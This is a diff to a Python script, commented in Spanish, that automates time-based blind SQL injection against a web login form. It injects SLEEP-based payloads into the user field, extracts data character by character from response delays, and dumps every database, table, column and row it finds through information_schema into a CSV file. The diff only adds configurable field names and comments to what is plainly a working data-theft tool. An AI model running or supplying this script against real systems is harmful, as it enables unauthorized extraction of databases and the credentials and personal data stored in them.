@@ -29,28 +29,38 @@ import csv
 import time
 from urllib.parse import urlparse
 
+# Argumentos
 parser = argparse.ArgumentParser()
-parser.add_argument("--url", required=True)
-parser.add_argument("--max", type=int, default=10)
-parser.add_argument("--delay", type=int, default=3)
+parser.add_argument("--url", required=True, help="URL del formulario vulnerable")
+parser.add_argument("--max", type=int, default=10, help="Máximo de elementos por nivel")
+parser.add_argument("--delay", type=int, default=3, help="Retraso en segundos para inferencia ciega")
+parser.add_argument("--userfield", required=True, help="Nombre del campo de usuario")
+parser.add_argument("--passfield", required=True, help="Nombre del campo de contraseña")
 args = parser.parse_args()
 
-url = args.url
-max_enum = args.max
-delay = args.delay
+# Variables
+url         = args.url
+max_enum    = args.max
+delay       = args.delay
+user_field  = args.userfield
+pass_field  = args.passfield
 
+# Función de comprobación
 def is_true(condition):
   payload = f"' AND IF({condition}, SLEEP({delay}), 0) -- -"
+  data = {user_field: payload, pass_field: "x"}
   t0 = time.time()
-  requests.post(url, data={"username": payload, "password": "x"})
+  requests.post(url, data=data)
   return time.time() - t0 > delay - 0.5
 
+# Extracción carácter a carácter
 def extract_char(query, pos):
   for c in range(32, 127):
     if is_true(f"ASCII(SUBSTRING(({query}),{pos},1))={c}"):
       return chr(c)
   return None
 
+# Extracción de string completo
 def extract_string(query, max_len=40):
   out = ""
   for pos in range(1, max_len + 1):
@@ -60,13 +70,14 @@ def extract_string(query, max_len=40):
     out += ch
   return out
 
-# CSV
+# Inicialización CSV
 host = urlparse(url).hostname.replace(".", "_")
 csv_file = f"dump_{host}.csv"
 csvf = open(csv_file, "w", newline="", encoding="utf-8")
 csvw = csv.writer(csvf)
 csvw.writerow(["Database", "Table", "Column", "RowIndex", "Value"])
 
+# Enumeración de bases de datos, tablas, columnas y filas
 for db_i in range(max_enum):
   db = extract_string(f"SELECT schema_name FROM information_schema.schemata LIMIT {db_i},1")
   if not db: break
@@ -93,4 +104,5 @@ for db_i in range(max_enum):
         break
 
 csvf.close()
-print(f"\n CSV guardado en {csv_file}")
+print(f"\nCSV guardado en {csv_file}")
+
